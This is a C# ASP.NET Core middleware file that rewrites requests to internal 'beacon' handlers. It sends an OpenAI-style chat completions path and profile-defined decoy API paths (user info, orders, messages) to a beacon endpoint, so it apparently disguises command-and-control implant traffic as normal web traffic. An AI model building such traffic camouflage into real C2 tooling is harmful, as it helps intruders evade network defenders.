using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Middleware;

/// <summary>
///
///
///
/// </summary>
public class BeaconEntryMiddleware
{
    private readonly RequestDelegate _next;

    public BeaconEntryMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, ProfileService profileService)
    {
        var path = context.Request.Path.Value ?? "/";

        if (path.StartsWith("/api/beacon/", StringComparison.OrdinalIgnoreCase))
        {
            await _next(context);
            return;
        }

        if (path.Equals("/v1/chat/completions", StringComparison.OrdinalIgnoreCase))
        {
            context.Request.Path = "/api/beacon/ai";
            await _next(context);
            return;
        }

        if (path.Equals("/api/v1/models/events", StringComparison.OrdinalIgnoreCase))
        {
            context.Request.Path = "/api/beacon/events";
            await _next(context);
            return;
        }

        var profile = await profileService.GetActiveProfileAsync();
        string entryPath;
        List<string> suffixes;
        if (profile is Profiles.ConfigurableProfile cp)
        {
            entryPath = "/" + cp.Config.EntryPath.TrimStart('/');
            suffixes = cp.Config.PathSuffixes ?? new();
        }
        else
        {
            entryPath = "/api";
            suffixes = new List<string>
            {
                "user/info", "orders/list", "profile", "settings",
                "notifications", "messages/unread",
            };
        }

        var matched = path.Equals(entryPath, StringComparison.OrdinalIgnoreCase);
        if (!matched)
        {
            var prefix = entryPath.TrimEnd('/') + "/";
            foreach (var s in suffixes)
            {
                var candidate = prefix + s.TrimStart('/');
                if (path.Equals(candidate, StringComparison.OrdinalIgnoreCase))
                {
                    matched = true;
                    break;
                }
            }
        }

        if (matched)
        {
            context.Request.Path = "/api/beacon/handle";
        }

        await _next(context);
    }
}
